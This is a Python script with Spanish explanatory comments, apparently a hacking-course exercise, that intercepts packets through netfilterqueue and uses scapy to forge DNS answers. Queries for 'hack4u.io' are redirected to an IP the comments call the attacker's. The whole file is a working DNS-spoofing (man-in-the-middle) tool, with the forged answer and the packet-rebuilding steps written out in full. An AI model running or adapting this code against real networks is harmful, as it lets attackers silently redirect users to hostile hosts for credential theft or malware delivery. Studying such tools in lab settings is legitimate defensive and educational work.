#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import signal, sys

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) # Aqui convertimos el paquete entrante, que es ilegible en un paquete IP con scapy, el cual ya podriamos manipular

    if scapy_packet.haslayer(scapy.DNSRR): # Si el scapy_packet tiene la capa DNS
        qname = scapy_packet[scapy.DNSQR].qname # Almacenariamos el dominio de la solicitud de la victima

        if b"hack4u.io" in qname:
            print("\n[!] Envenenando el Domino hack4u.io")

            # Lo que tendriamos que hacer en este punto es un contruir un paquete DNSRR que podamos controlar nosotros.
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.68.60") # Contruccion del paquete DNSRR, poniendo como destino (rname) nuestra IP de atacante
            scapy_packet[scapy.DNS].an = answer # El scapy_packet en su capa DNS en el campo de la respuesta (.an) ahora vale nuestra respuesta adulterada
            scapy_packet[scapy.DNS].ancount = 1 # Como nostros solo vamos a realizar un paquete es importante modificar el campo ancount a 1

            # Borramos los campos len y chksum para que no entren en conflicto
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(scapy_packet.build()) # Igualamos el paquete original de la consulta a nuestro paquete ya adulterado, .build lo que hace es que te muestra la info ya en formato web

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) # Aqui asociamos el script con el numero de cola antes asignado y cada uno de estos paquetes los "procesamos" con la funcion mencionada
queue.run() # bucle en el que constantemente se estaran procesando cada uno de los paquetes
